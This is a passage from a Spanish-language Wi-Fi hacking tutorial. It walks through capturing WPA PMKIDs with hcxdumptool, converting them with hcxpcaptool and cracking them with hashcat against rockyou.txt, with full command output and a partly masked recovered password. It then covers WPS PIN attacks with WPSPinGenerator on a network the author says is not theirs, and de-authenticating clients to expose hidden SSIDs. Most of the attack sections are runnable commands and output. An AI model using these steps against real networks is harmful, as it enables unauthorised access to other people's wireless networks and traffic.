 wlan0mon  »  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sencillo, ¿verdad?, pues ya está, así de fácil. En el fichero &lt;strong&gt;/root/bettercap-wifi-handshakes.pcap&lt;/strong&gt; ahora
lo único que tenemos que pasar es la herramienta &lt;strong&gt;hcxpcaptool&lt;/strong&gt; para convertir a Hashes nuestras capturas y
listo.&lt;/p&gt;

&lt;p&gt;Prefiero comentar esta parte con más detalle en los siguientes puntos.&lt;/p&gt;

&lt;h5 id=&quot;ataque-via-hcxdumptool&quot;&gt;Ataque via hcxdumptool&lt;/h5&gt;

&lt;p&gt;Esta es la forma en la que yo lo suelo hacer. Ejecutamos el siguiente comando para capturar todos los PKMID’s
posibles:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#hcxdumptool -i wlan0mon -o Captura --enable_status=1&lt;/span&gt;
initialization...
warning: NetworkManager is running with pid 27706
warning: wpa_supplicant is running with pid 27684
warning: wlan0mon is probably a monitor interface

start capturing &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stop with ctrl+c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
INTERFACE................: wlan0mon
ERRORMAX.................: 100 errors
FILTERLIST...............: 0 entries
MAC CLIENT...............: b0febdab6d9d
MAC ACCESS POINT.........: 24336c5495c9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;incremented on every new client&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 62752
ANONCE...................: 5e37baf7d8026ae9a9b5dcd74239558a74149218819377f2d3d866aa4c6249ab

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:42:02 - 001] fcb4e699a909 -&amp;gt; b0febdab6d9d &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FOUND PMKID CLIENT-LESS]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:42:08 - 006] 1cb044d41678 -&amp;gt; b0febdab6d9d &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FOUND PMKID CLIENT-LESS]
INFO: &lt;span class=&quot;nv&quot;&gt;cha&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11, &lt;span class=&quot;nv&quot;&gt;rx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1314, rx&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dropped&lt;span class=&quot;o&quot;&gt;)=&lt;/span&gt;602, &lt;span class=&quot;nv&quot;&gt;tx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;117, &lt;span class=&quot;nv&quot;&gt;powned&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2, &lt;span class=&quot;nv&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y como vemos, en cuestión de segundos tengo 2 redes vulnerables de las cuales he obtenido el PKMID. En este
punto, estaríamos igual que con &lt;strong&gt;Bettercap&lt;/strong&gt;, es decir, tenemos la captura, ¿y ahora qué?, descubrámoslo en el siguiente punto.&lt;/p&gt;

&lt;h5 id=&quot;uso-de-hcxpcaptool&quot;&gt;Uso de hcxpcaptool&lt;/h5&gt;

&lt;p&gt;Ahora viene la parte interesante, hemos visto lo sencillo que ha sido obtener un PKMID de 2 redes distintas.
Pues ahora tan solo tenemos que aplicar el siguiente comando para visualizar el hash correspondiente a la contraseña de la red inalámbrica:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#hcxpcaptool -z myHashes Captura &lt;/span&gt;

reading from Captura
                                                
summary:                                        
&lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;
file name........................: Captura
file type........................: pcapng 1.0
file hardware information........: x86_64
file os information..............: Linux 4.19.0-parrot1-13t-amd64
file application information.....: hcxdumptool 5.1.7
network type.....................: DLT_IEEE802_11_RADIO &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;127&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
endianness.......................: little endian
&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;errors......................: flawless
packets inside...................: 30
skipped packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;damaged&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;........: 0
packets with GPS data............: 0
packets with FCS.................: 30
beacons &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;total&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;..................: 9
beacons &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WPS info inside&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;........: 6
authentications &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OPEN SYSTEM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;....: 9
authentications &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BROADCOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.......: 7
EAPOL packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;total&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;............: 12
EAPOL packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.............: 12
PMKIDs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;total&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...................: 2
PMKIDs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;WPA2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;....................: 12
PMKIDs from access points........: 2
best PMKIDs......................: 2

2 PMKID&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; written to myHashes
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat myHashes &lt;/span&gt;
0d4191730a005481706436bdbc50919c&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;fcb4e699a909&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b0febdab6d9d&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4d4f5649535441525f41393038
2fb026310184f6efcb0fd0d69b198b3a&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1cb044d41678&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b0febdab6d9d&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4d4f5649535441525f31363737
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ANOTACIÓN&lt;/strong&gt;: Para saber a qué redes pertenecen estos Hashes, tan sólo tenemos que visualizar el valor
comprendido entre el primer y segundo asterisco. Corresponden a las BSSID’s de los AP’s.&lt;/p&gt;

&lt;p&gt;Y estos, ya pueden ser pasados por &lt;strong&gt;hashcat&lt;/strong&gt; para someterlos a la fase de Cracking:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/usr/share/wordlists]
└──╼ &lt;span class=&quot;c&quot;&gt;#hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt &lt;/span&gt;
hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...

OpenCL Platform &lt;span class=&quot;c&quot;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;======================================&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU&lt;/span&gt;

OpenCL Platform &lt;span class=&quot;c&quot;&gt;#2: The pocl project&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.&lt;/span&gt;

Hashes: 2 digests&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Zero-Byte
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to 90c

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=16800 -D _unroll'&lt;/span&gt;
Dictionary cache hit:
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: rockyou.txt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 14344387
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 139921538
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 14344387

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoint &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q]uit &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Estimated...: Mon Aug 12 22:53:08 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5 mins, 1 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Speed.#1.........:    93064 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;55.72ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests, 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Salts
Progress.........: 610384/28688774 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.13%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Rejected.........: 446544/610384 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;73.16%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Point....: 0/14344387 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3712-3840
Candidates.#1....: 123456789 -&amp;gt; sunflower15
Hardware.Mon.#1..: Temp: 64c Util: 99% Core:1670MHz Mem:3504MHz Bus:8

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoint &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q]uit &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Estimated...: Mon Aug 12 22:53:09 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 mins, 58 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Speed.#1.........:    91919 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;55.94ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests, 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Salts
Progress.........: 1292574/28688774 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.51%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Rejected.........: 801054/1292574 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;61.97%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Point....: 387112/14344387 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.70%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:3840-3968
Candidates.#1....: sunflower11 -&amp;gt; 22lovers
Hardware.Mon.#1..: Temp: 66c Util:100% Core:1657MHz Mem:3504MHz Bus:8

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoint &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q]uit &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En mi caso, tiro de &lt;strong&gt;GPU&lt;/strong&gt; y os puedo decir que el tiempo total para cracker estos hashes es de 5 minutos.
(Aunque también se puede ver en el output anterior).&lt;/p&gt;

&lt;p&gt;Se podría decir que es una gozada, porque nos estamos olvidando tanto de &lt;strong&gt;aircrack&lt;/strong&gt; como de &lt;strong&gt;aireplay&lt;/strong&gt;, de
&lt;strong&gt;airodump&lt;/strong&gt;, &lt;strong&gt;pyrit&lt;/strong&gt;, &lt;strong&gt;airolib&lt;/strong&gt;, &lt;strong&gt;cowpatty&lt;/strong&gt;, &lt;strong&gt;genpmk&lt;/strong&gt;, etc.&lt;/p&gt;

&lt;p&gt;Una vez crackeada la contraseña, esta es mostrada:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoint &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q]uit &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 min, 51 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Estimated...: Mon Aug 12 22:52:25 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 mins, 30 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Speed.#1.........:    89458 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;57.26ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests, 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Salts
Progress.........: 15218868/28688774 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53.05%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Rejected.........: 5388468/15218868 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;35.41%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Point....: 7545850/14344387 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;52.60%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2944
Candidates.#1....: horneybabe1987 -&amp;gt; groovejet
Hardware.Mon.#1..: Temp: 86c Util: 99% Core:1632MHz Mem:3504MHz Bus:8

Approaching final keyspace - workload adjusted.  

2fb026310184f6efcb0fd0d69b198b3a&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1cb044d41678&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b0febdab6d9d&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXX
                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: WPA-PMKID-PBKDF2
Hash.Target......: myHashes
Time.Started.....: Mon Aug 12 22:48:04 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3 mins, 36 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Time.Estimated...: Mon Aug 12 22:51:40 2019 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rockyou.txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Speed.#1.........:    88906 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;47.34ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 1/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;50.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests, 1/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;50.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Salts
Progress.........: 28688774/28688774 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Rejected.........: 9469826/28688774 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;33.01%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Point....: 14344387/14344387 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 0133112024erdalk -&amp;gt; KqpsEFunpo7w29nrbx4H
Hardware.Mon.#1..: Temp: 88c Util: 99% Core:1632MHz Mem:3504MHz Bus:8

Started: Mon Aug 12 22:48:02 2019
Stopped: Mon Aug 12 22:51:42 2019
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;O también:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/usr/share/wordlists]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat myHashes &lt;/span&gt;
0d4191730a005481706436bdbc50919c&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;fcb4e699a909&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b0febdab6d9d&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4d4f5649535441525f41393038
2fb026310184f6efcb0fd0d69b198b3a&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1cb044d41678&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b0febdab6d9d&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4d4f5649535441525f31363737
┌─[root@parrot]─[/usr/share/wordlists]
└──╼ &lt;span class=&quot;c&quot;&gt;#hashcat -m 16800 --show myHashes &lt;/span&gt;
2fb026310184f6efcb0fd0d69b198b3a&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1cb044d41678&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b0febdab6d9d&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;4d4f5649535441525f31363737:KqpsEFunpXXXXXXXXXXXXX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ataques-por-wps&quot;&gt;Ataques por WPS&lt;/h3&gt;

&lt;p&gt;Ya como casi último de los puntos a tratar para redes de protocolo &lt;strong&gt;WPA/WPA2&lt;/strong&gt;, no puedo acabar la sección
sin mencionar el famoso &lt;strong&gt;WPS&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Desde mi experiencia, os podría estar comentando ahora mismo cómo usar &lt;strong&gt;pixiedust&lt;/strong&gt;, &lt;strong&gt;reaver&lt;/strong&gt; o derivados,
pero prefiero mostraros herramientas de utilidad que realmente den resultados, o que por lo menos tengan una
tasa de éxito más probable.&lt;/p&gt;

&lt;h4 id=&quot;uso-de-wpspingenerator&quot;&gt;Uso de WPSPinGenerator&lt;/h4&gt;

&lt;p&gt;Si os fijáis, en todo el &lt;strong&gt;Gist&lt;/strong&gt;, hemos hecho la gran parte de procedimientos a mano, me refiero, sin hacer
uso de herramientas automatizadas. No suelo acostumbrar a hacer uso de herramientas que te automatizan un
procedimiento, sobre todo por la curiosidad que me causa el cómo funciona esa por debajo. Sin embargo, para
este caso, hay una de ellas especialmente destinadas a &lt;strong&gt;WPS&lt;/strong&gt; que sí que utilizo, por la gran tasa de acierto
de la que dispone.&lt;/p&gt;

&lt;p&gt;El sistema operativo &lt;strong&gt;Wifislax&lt;/strong&gt;, se podría decir que es un sistema operativo orientado al Hacking y
Auditoría WiFi. Cuenta con bastantes herramientas de automatización como Fluxion, Linset o Wifimosys que
automatizan todo lo que nosotros hemos estado haciendo a mano. Es un OS principalmente orientados a &lt;strong&gt;Script
Kiddies&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Una de las herramientas de &lt;strong&gt;Wifislax&lt;/strong&gt; que uso con bastante frecuencia es &lt;strong&gt;WPSPinGenerator&lt;/strong&gt;, por no decir
que es la única herramienta que utilizo de este OS. ¿Qué nos permite hacer &lt;strong&gt;WPSPinGenerator&lt;/strong&gt;?, veámoslo con un ejemplo práctico.&lt;/p&gt;

&lt;p&gt;Al principio, es necesario seleccionar la interfaz de red con la que trabajar, especificar los canales sobre
los cual queremos escanear, en fin… lo típico. Esta parte me la saltaré.&lt;/p&gt;

&lt;p&gt;Una vez escaneamos las redes disponibles de nuestro entorno, vemos algo como esto:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc39.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos fijamos, vemos que para cada red inalámbrica, se nos dice si esta cuenta o no con un PIN genérico.
(Recomiendo que leas cómo funciona la asociación a través de PIN).&lt;/p&gt;

&lt;p&gt;Una vez seleccionamos la red, fijaros que interesante:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc3a.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos lista los posibles PINES para esa red. Generalmente, a los 3 intentos, el router bloquea el WPS para que
no se puedan enviar más solicitudes. Sin embargo, a veces en vez de ser 5 pines, la herramienta nos reporta 2,
o incluso 1.&lt;/p&gt;

&lt;p&gt;Para este caso, que son 5, el PIN correcto estaba en la primera posición (no es mi red), y tras seleccionar la
opción &lt;strong&gt;2&lt;/strong&gt;, obtenemos los siguientes resultados:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc3g.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La contraseña de la red inalámbrica en texto claro directamente. Por si no la ves bien:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wc3q.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;¿Lo bueno de esto?, que no importa cuantas veces cambies la contraseña… pues si el PIN sigue siendo el mismo
para la eternidad, como atacantes siempre vamos a ser capaces de verla en cuestión de segundos,
independientemente de su longitud o robustez.&lt;/p&gt;

&lt;h3 id=&quot;redes-wpa-ocultas&quot;&gt;Redes WPA Ocultas&lt;/h3&gt;

&lt;p&gt;Ya para acabar este Gist, os cito una técnica para redes WPA que están configuradas como ocultas.&lt;/p&gt;

&lt;p&gt;Generalmente, desde &lt;strong&gt;aircrack&lt;/strong&gt;, se listan las redes ocultas de esta forma:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;length: 0&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;¿Qué hacemos en este caso cuando la red está oculta?, bueno, sabemos que a nivel de filtrado no vamos a tener
problema… pues filtramos por la &lt;strong&gt;BSSID&lt;/strong&gt; y problema resuelto. Sin embargo, hay un pequeño fallo de esta
configuración que nos permite dar con la &lt;strong&gt;ESSID&lt;/strong&gt; del AP.&lt;/p&gt;

&lt;p&gt;Si efecutamos un ataque de de-autenticación global para expulsar a todos los clientes (o dirigido en caso de
que haya sólo uno), cuando estos tratan de re-asociarse al AP, uno de los paquetes que mandan ya hemos visto que son los &lt;strong&gt;Probe Request&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&amp;gt;/dev/null&lt;/span&gt;
   59 3.094674701 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1378, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
